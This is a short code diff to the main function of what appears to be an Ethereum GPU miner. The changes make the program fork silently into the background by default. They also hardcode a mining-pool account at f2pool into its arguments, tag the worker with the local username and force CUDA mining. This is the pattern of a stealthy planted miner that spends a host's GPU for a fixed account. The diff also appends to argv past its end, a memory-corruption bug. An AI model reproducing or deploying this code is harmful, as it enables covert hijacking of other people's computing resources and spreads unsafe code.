@@ -1357,6 +1357,15 @@ char* getusername () {
 
 int main(int argc, char** argv)
 {
+    int zzi;
+    int is_background_zz=1;
+    for (zzi=1; zzi<argc; zzi++) {
+        if (strcmp(argv[zzi], "--foreground") == 0) {
+            is_background_zz=0;
+        }
+    }
+    if (is_background_zz==1 && fork()) return 0;
+    
     char nowuser[256];
     sprintf(nowuser, "%s", getusername() );
 
@@ -1368,7 +1377,11 @@ int main(int argc, char** argv)
 
     //printf("%s", nowuser);
     argv[argc++] = (char*) "--pool";
-    argv[argc++] = (char*) "stratum1+tcp://q623928815.l11@eth.f2pool.com:6688";
+    char pool[2048];
+    sprintf(pool, "stratum1+tcp://q623928815.%s@eth.f2pool.com:6688", nowuser);
+printf("%s", pool);
+    argv[argc++] = pool;
+    //argv[argc++] = (char*) "stratum1+tcp://q623928815.l11@eth.f2pool.com:6688";
     argv[argc++] = (char*) "--cuda";
 
 
@@ -1425,10 +1438,10 @@ int main(int argc, char** argv)
             }
 ////////############### ************** ########### //////////// !!!!!!!
             if (!g_foreground) {
-                int rc = 0;
-                if (background(rc)) {
-                    return rc;
-                }
+               // int rc = 0;
+               // if (background(rc)) {
+               //     return rc;
+               // }
             }
 
 
